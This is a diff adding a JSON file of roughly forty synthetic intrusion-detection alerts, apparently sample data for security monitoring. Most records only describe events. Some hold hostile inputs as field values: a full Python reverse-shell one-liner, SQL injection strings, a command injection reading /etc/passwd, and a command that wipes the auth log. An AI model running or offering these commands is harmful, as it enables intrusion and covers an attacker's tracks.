@@ -1,0 +1,686 @@
+[
+    {
+        "timestamp": "2025-01-30T12:34:56.789Z",
+        "source_ip": "192.168.1.100",
+        "destination_ip": "192.168.1.1",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000001",
+            "category": "Attempted Information Leak",
+            "signature": "Nmap TCP Syn Scan Detected",
+            "severity": 3
+        },
+        "network": {
+            "protocol": "TCP",
+            "port": "22, 80, 443, 3389",
+            "flags": "SYN"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T12:45:10.321Z",
+        "source_ip": "203.0.113.45",
+        "destination_ip": "192.168.1.10",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000002",
+            "category": "Brute Force Attack",
+            "signature": "Multiple Failed SSH Logins Detected",
+            "severity": 4
+        },
+        "network": {
+            "protocol": "TCP",
+            "port": "22"
+        },
+        "auth": {
+            "attempts": 15,
+            "status": "failed"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T13:05:20.456Z",
+        "source_ip": "198.51.100.25",
+        "destination_ip": "192.168.1.50",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000003",
+            "category": "SQL Injection Attempt",
+            "signature": "Possible SQL Injection via HTTP Request",
+            "severity": 5
+        },
+        "http": {
+            "method": "GET",
+            "url": "/login.php?user=admin' OR '1'='1",
+            "status_code": 200
+        }
+    },
+    {
+        "timestamp": "2025-01-30T13:30:40.789Z",
+        "source_ip": "10.0.0.5",
+        "destination_ip": "10.0.0.10",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000004",
+            "category": "Malware Execution",
+            "signature": "Suspicious Executable Downloaded",
+            "severity": 5
+        },
+        "file": {
+            "filename": "ransomware.exe",
+            "hash": "d41d8cd98f00b204e9800998ecf8427e",
+            "size": 512000
+        }
+    },
+    {
+        "timestamp": "2025-01-30T14:10:55.987Z",
+        "source_ip": "172.16.100.100",
+        "destination_ip": "8.8.8.8",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000005",
+            "category": "Command and Control",
+            "signature": "Possible C2 Communication Detected",
+            "severity": 5
+        },
+        "network": {
+            "protocol": "DNS",
+            "query": "xyzmalware.com",
+            "response": "A 203.0.113.99"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T14:50:30.654Z",
+        "source_ip": "192.168.1.15",
+        "destination_ip": "localhost",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000006",
+            "category": "Privilege Escalation",
+            "signature": "User Attempted Unauthorized Privilege Escalation",
+            "severity": 4
+        },
+        "auth": {
+            "user": "hacker",
+            "command": "sudo su",
+            "status": "failed"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T15:20:10.456Z",
+        "source_ip": "192.168.2.20",
+        "destination_ip": "192.168.1.30",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000007",
+            "category": "Web Exploitation",
+            "signature": "Remote Code Execution via Web Server",
+            "severity": 5
+        },
+        "http": {
+            "method": "POST",
+            "url": "/upload.php",
+            "status_code": 500
+        }
+    },
+    {
+        "timestamp": "2025-01-30T16:10:55.654Z",
+        "source_ip": "203.0.113.200",
+        "destination_ip": "10.10.10.10",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000008",
+            "category": "Denial of Service",
+            "signature": "DDoS Attack Detected",
+            "severity": 5
+        },
+        "network": {
+            "protocol": "UDP",
+            "port": "53",
+            "flags": "FLOOD"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T17:30:40.654Z",
+        "source_ip": "198.51.100.99",
+        "destination_ip": "192.168.1.50",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000009",
+            "category": "Ransomware Activity",
+            "signature": "Encrypted Files Detected",
+            "severity": 5
+        },
+        "file": {
+            "filename": "*.encrypted",
+            "hash": "unknown",
+            "size": 1024000
+        }
+    },
+    {
+        "timestamp": "2025-01-30T18:10:20.123Z",
+        "source_ip": "172.16.200.5",
+        "destination_ip": "10.0.0.2",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000010",
+            "category": "Credential Theft",
+            "signature": "Mimikatz Memory Dump Detected",
+            "severity": 5
+        },
+        "process": {
+            "name": "mimikatz.exe",
+            "pid": 4210
+        }
+    },
+    {
+        "timestamp": "2025-01-30T18:45:22.789Z",
+        "source_ip": "203.0.113.55",
+        "destination_ip": "192.168.1.100",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000011",
+            "category": "MITM Attack",
+            "signature": "Man-in-the-Middle Attack Detected",
+            "severity": 4
+        },
+        "network": {
+            "protocol": "HTTPS",
+            "port": "443",
+            "flags": "CERTIFICATE_SPOOF"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T19:10:33.321Z",
+        "source_ip": "192.168.50.10",
+        "destination_ip": "192.168.1.10",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000012",
+            "category": "Privilege Escalation",
+            "signature": "Unauthorized Root Privileges Gained",
+            "severity": 5
+        },
+        "auth": {
+            "user": "attacker",
+            "command": "sudo -i",
+            "status": "success"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T19:30:45.456Z",
+        "source_ip": "198.51.100.75",
+        "destination_ip": "10.0.0.100",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000013",
+            "category": "SQL Injection Attempt",
+            "signature": "Blind SQL Injection Detected",
+            "severity": 5
+        },
+        "http": {
+            "method": "POST",
+            "url": "/search.php?query=' OR 1=1 --",
+            "status_code": 200
+        }
+    },
+    {
+        "timestamp": "2025-01-30T19:50:50.789Z",
+        "source_ip": "172.16.1.5",
+        "destination_ip": "172.16.1.20",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000014",
+            "category": "Malware Download",
+            "signature": "Trojan Detected in Network Traffic",
+            "severity": 5
+        },
+        "file": {
+            "filename": "trojan.exe",
+            "hash": "9a3b2c1d4e5f67890123456789abcdef",
+            "size": 450000
+        }
+    },
+    {
+        "timestamp": "2025-01-30T20:05:30.987Z",
+        "source_ip": "192.168.3.40",
+        "destination_ip": "8.8.8.8",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000015",
+            "category": "Command and Control",
+            "signature": "Suspicious Beaconing Detected",
+            "severity": 5
+        },
+        "network": {
+            "protocol": "HTTPS",
+            "query": "malicious-server.com",
+            "response": "A 192.168.100.200"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T20:30:10.654Z",
+        "source_ip": "203.0.113.99",
+        "destination_ip": "192.168.1.150",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000016",
+            "category": "Exploit Attempt",
+            "signature": "Windows SMB Exploit (EternalBlue) Detected",
+            "severity": 5
+        },
+        "network": {
+            "protocol": "SMB",
+            "port": "445",
+            "flags": "EXPLOIT"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T21:00:40.789Z",
+        "source_ip": "10.1.1.200",
+        "destination_ip": "10.1.1.50",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000017",
+            "category": "Insider Threat",
+            "signature": "Unauthorized File Access Detected",
+            "severity": 4
+        },
+        "file": {
+            "filename": "/etc/shadow",
+            "hash": "unknown",
+            "size": 4096
+        }
+    },
+    {
+        "timestamp": "2025-01-30T21:25:55.222Z",
+        "source_ip": "192.168.200.1",
+        "destination_ip": "192.168.200.100",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000018",
+            "category": "Denial of Service",
+            "signature": "SYN Flood Attack Detected",
+            "severity": 5
+        },
+        "network": {
+            "protocol": "TCP",
+            "port": "80",
+            "flags": "SYN FLOOD"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T22:00:20.654Z",
+        "source_ip": "10.10.10.5",
+        "destination_ip": "192.168.1.200",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000019",
+            "category": "Phishing Attempt",
+            "signature": "Fake Login Page Detected",
+            "severity": 4
+        },
+        "http": {
+            "method": "GET",
+            "url": "/login.php?redirect=fakebank.com",
+            "status_code": 200
+        }
+    },
+    {
+        "timestamp": "2025-01-30T22:30:35.987Z",
+        "source_ip": "192.168.3.150",
+        "destination_ip": "10.10.20.10",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000020",
+            "category": "Zero-Day Exploit",
+            "signature": "Exploit Detected in Unpatched Software",
+            "severity": 5
+        },
+        "network": {
+            "protocol": "TCP",
+            "port": "3389",
+            "flags": "EXPLOIT"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T23:10:12.345Z",
+        "source_ip": "203.0.113.25",
+        "destination_ip": "192.168.1.1",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000021",
+            "category": "DNS Tunneling",
+            "signature": "Suspicious DNS Query Pattern Detected",
+            "severity": 4
+        },
+        "network": {
+            "protocol": "DNS",
+            "query": "aW5mZWN0ZWRjb21tYW5kLmV4ZQ==.malicious.com",
+            "response": "TXT Infected Command"
+        }
+    },
+    {
+        "timestamp": "2025-01-30T23:45:34.123Z",
+        "source_ip": "10.0.0.20",
+        "destination_ip": "10.0.0.5",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000022",
+            "category": "Session Hijacking",
+            "signature": "JWT Token Tampering Detected",
+            "severity": 5
+        },
+        "auth": {
+            "user": "compromised_user",
+            "method": "JWT",
+            "status": "token modified"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T00:15:54.789Z",
+        "source_ip": "192.168.100.50",
+        "destination_ip": "192.168.1.200",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000023",
+            "category": "Web Shell Upload",
+            "signature": "PHP Web Shell Detected",
+            "severity": 5
+        },
+        "file": {
+            "filename": "cmd.php",
+            "hash": "7c4a8d09ca3762af61e59520943dc26494f8941b",
+            "size": 1500
+        }
+    },
+    {
+        "timestamp": "2025-01-31T00:45:21.654Z",
+        "source_ip": "172.16.50.10",
+        "destination_ip": "10.10.20.20",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000024",
+            "category": "Remote Code Execution",
+            "signature": "Python Reverse Shell Detected",
+            "severity": 5
+        },
+        "process": {
+            "name": "python3",
+            "command": "python3 -c 'import socket,subprocess,os; s=socket.socket();s.connect((\"192.168.1.100\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"]);'",
+            "pid": 8705
+        }
+    },
+    {
+        "timestamp": "2025-01-31T01:10:30.654Z",
+        "source_ip": "192.168.1.15",
+        "destination_ip": "192.168.1.50",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000025",
+            "category": "Code Injection",
+            "signature": "Command Injection via HTTP Request",
+            "severity": 5
+        },
+        "http": {
+            "method": "POST",
+            "url": "/admin.php?cmd=cat /etc/passwd",
+            "status_code": 200
+        }
+    },
+    {
+        "timestamp": "2025-01-31T01:40:45.987Z",
+        "source_ip": "10.1.1.30",
+        "destination_ip": "10.1.1.100",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000026",
+            "category": "Insider Threat",
+            "signature": "Unauthorized Access to Financial Records",
+            "severity": 4
+        },
+        "file": {
+            "filename": "/finance/reports.xlsx",
+            "hash": "unknown",
+            "size": 1048576
+        }
+    },
+    {
+        "timestamp": "2025-01-31T02:05:15.789Z",
+        "source_ip": "203.0.113.99",
+        "destination_ip": "192.168.2.10",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000027",
+            "category": "Phishing Attempt",
+            "signature": "Malicious Email Attachment Detected",
+            "severity": 4
+        },
+        "email": {
+            "sender": "hacker@fakebank.com",
+            "recipient": "victim@company.com",
+            "subject": "Urgent: Verify Your Account",
+            "attachment": "invoice.exe"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T02:30:30.321Z",
+        "source_ip": "10.10.50.5",
+        "destination_ip": "192.168.3.20",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000028",
+            "category": "Ransomware Attack",
+            "signature": "Mass File Encryption Detected",
+            "severity": 5
+        },
+        "file": {
+            "filename": "*.enc",
+            "hash": "unknown",
+            "size": 52428800
+        }
+    },
+    {
+        "timestamp": "2025-01-31T03:00:10.456Z",
+        "source_ip": "198.51.100.200",
+        "destination_ip": "10.0.0.50",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000029",
+            "category": "IoT Exploit",
+            "signature": "Unauthorized Access to IoT Device",
+            "severity": 4
+        },
+        "device": {
+            "type": "Smart Camera",
+            "firmware_version": "1.0.2",
+            "access_method": "Telnet"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T03:25:55.654Z",
+        "source_ip": "172.16.100.1",
+        "destination_ip": "10.10.10.100",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000030",
+            "category": "Denial of Service",
+            "signature": "Massive SYN Flood Attack",
+            "severity": 5
+        },
+        "network": {
+            "protocol": "TCP",
+            "port": "443",
+            "flags": "SYN FLOOD"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T04:00:15.123Z",
+        "source_ip": "10.10.10.5",
+        "destination_ip": "192.168.1.10",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000031",
+            "category": "Kerberoasting Attack",
+            "signature": "Unusual Kerberos Ticket Requests Detected",
+            "severity": 5
+        },
+        "auth": {
+            "user": "unknown",
+            "service": "krbtgt",
+            "status": "multiple ticket requests"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T04:30:25.456Z",
+        "source_ip": "203.0.113.89",
+        "destination_ip": "192.168.2.20",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000032",
+            "category": "API Abuse",
+            "signature": "High Rate of API Calls Detected",
+            "severity": 4
+        },
+        "api": {
+            "endpoint": "/v1/users",
+            "method": "GET",
+            "requests_per_minute": 1500
+        }
+    },
+    {
+        "timestamp": "2025-01-31T05:00:45.789Z",
+        "source_ip": "10.1.1.100",
+        "destination_ip": "10.1.1.200",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000033",
+            "category": "Log Tampering",
+            "signature": "Attempt to Clear System Logs Detected",
+            "severity": 5
+        },
+        "system": {
+            "command": "echo '' > /var/log/auth.log",
+            "user": "root",
+            "status": "executed"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T05:20:30.654Z",
+        "source_ip": "172.16.50.20",
+        "destination_ip": "10.10.20.30",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000034",
+            "category": "USB Malware Execution",
+            "signature": "Suspicious Executable Launched from USB",
+            "severity": 5
+        },
+        "file": {
+            "filename": "autorun.exe",
+            "hash": "f2b4a8c9d7e60123456789abcdef0123",
+            "size": 102400
+        }
+    },
+    {
+        "timestamp": "2025-01-31T05:45:50.321Z",
+        "source_ip": "192.168.1.15",
+        "destination_ip": "192.168.1.100",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000035",
+            "category": "Supply Chain Attack",
+            "signature": "Compromised Software Update Detected",
+            "severity": 5
+        },
+        "software": {
+            "name": "PackageManagerX",
+            "version": "2.3.1",
+            "source": "malicious.repo.com"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T06:10:15.654Z",
+        "source_ip": "198.51.100.150",
+        "destination_ip": "192.168.3.50",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000036",
+            "category": "Cloud Account Compromise",
+            "signature": "Unusual Cloud Login Location",
+            "severity": 4
+        },
+        "auth": {
+            "user": "cloud_admin",
+            "location": "Russia",
+            "status": "successful login"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T06:40:20.987Z",
+        "source_ip": "203.0.113.5",
+        "destination_ip": "192.168.1.2",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000037",
+            "category": "Data Exfiltration",
+            "signature": "Large Data Transfer to External Server",
+            "severity": 5
+        },
+        "network": {
+            "protocol": "HTTPS",
+            "port": "443",
+            "data_transferred_MB": 500
+        }
+    },
+    {
+        "timestamp": "2025-01-31T07:00:30.456Z",
+        "source_ip": "172.16.200.50",
+        "destination_ip": "192.168.2.100",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000038",
+            "category": "Cryptojacking",
+            "signature": "Unauthorized Cryptocurrency Mining Detected",
+            "severity": 5
+        },
+        "process": {
+            "name": "xmrig",
+            "cpu_usage": "98%",
+            "status": "running"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T07:30:50.123Z",
+        "source_ip": "198.51.100.5",
+        "destination_ip": "192.168.3.200",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000039",
+            "category": "WiFi Attack",
+            "signature": "Evil Twin Access Point Detected",
+            "severity": 4
+        },
+        "network": {
+            "ssid": "CompanyWiFi",
+            "bssid": "00:14:22:01:23:45",
+            "spoofed": "true"
+        }
+    },
+    {
+        "timestamp": "2025-01-31T08:00:15.987Z",
+        "source_ip": "192.168.50.5",
+        "destination_ip": "10.10.30.10",
+        "event_type": "alert",
+        "alert": {
+            "signature_id": "2000040",
+            "category": "Deep Packet Inspection Bypass",
+            "signature": "Encrypted Traffic Over Non-Standard Ports",
+            "severity": 4
+        },
+        "network": {
+            "protocol": "TLS",
+            "port": "8080",
+            "encryption": "AES-256"
+        }
+    }
+]
+    
